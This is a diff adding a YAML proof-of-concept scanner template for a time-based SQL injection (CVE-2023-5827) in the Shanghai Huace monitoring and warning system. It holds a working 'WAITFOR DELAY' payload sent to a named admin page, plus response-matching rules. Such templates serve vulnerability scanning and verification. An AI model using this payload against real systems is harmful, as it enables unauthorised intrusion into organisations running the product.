@@ -1,0 +1,16 @@
+id: poc-yaml-huace-monitoring-warning-system-sqli
+info:
+  name: 上海华测监测预警系统 SQL注入漏洞
+  severity: high
+  tags:
+  - CVE-2023-5827
+  - SQL注入
+  finger: 上海华测监测预警系统
+variables:
+  t1: random_int(5,10)
+requests:
+- method: GET
+  path: /Web/SysManage/UserEdit.aspx?ID=0'WAITFOR+DELAY+'0:0:{{.t1}}'--+
+  expression: "status_code == 302 \n&& contains(body, \"/Web/500.html\") \n&& contains(body,\
+    \ \"Object moved to\")\n&& contains(body, \"<title>Object moved</title>\")\n"
+transport: http
